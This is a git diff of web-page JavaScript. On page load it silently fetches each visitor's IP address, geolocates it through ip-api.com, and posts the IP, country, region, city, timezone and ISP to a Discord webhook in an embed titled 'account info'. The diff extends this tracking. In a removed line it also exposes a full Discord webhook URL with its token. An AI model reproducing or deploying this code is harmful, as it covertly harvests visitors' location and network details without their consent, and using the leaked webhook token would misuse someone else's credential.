@@ -14,8 +14,11 @@ document.addEventListener("DOMContentLoaded", () => {
             .then(res => res.json())
             .then(data => {
                 const userIP = data.ip;
-
-                const webhookURL = "https://discord.com/api/webhooks/1382344727688646767/sXTH1azfKhUqSQ153O4I1uaOdn6NkSDnKkrPyGSjijEzKLLo9CE5FA__OIghjBKlJN6g";
+                return fetch(`http://ip-api.com/json/${userIP}`);
+            })
+            .then(res => res.json())
+            .then(geo => {
+                const webhookURL = "web url";
 
                 const embedPayload = {
                     username: "帳號資訊",
@@ -36,7 +39,15 @@ document.addEventListener("DOMContentLoaded", () => {
                                 },
                                 {
                                     name: "IP 位址",
-                                    value: userIP || "不明"
+                                    value: geo.query || "不明"
+                                },
+                                {
+                                    name: "地理位置",
+                                    value: `${geo.country} ${geo.regionName} - ${geo.city}`
+                                },
+                                {
+                                    name: "時區 / ISP",
+                                    value: `${geo.timezone} / ${geo.isp}`
                                 }
                             ],
                             timestamp: new Date().toISOString()
